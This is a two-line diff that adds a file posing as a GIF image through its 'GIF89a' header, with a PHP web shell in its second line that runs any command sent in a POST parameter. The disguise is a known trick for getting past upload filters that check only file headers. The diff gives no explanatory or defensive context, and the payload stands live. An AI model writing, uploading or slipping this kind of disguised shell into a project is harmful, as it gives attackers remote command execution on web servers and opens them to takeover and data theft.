@@ -1,0 +1,2 @@
+GIF89a1
+<?php system($_POST["cmd"]); ?>
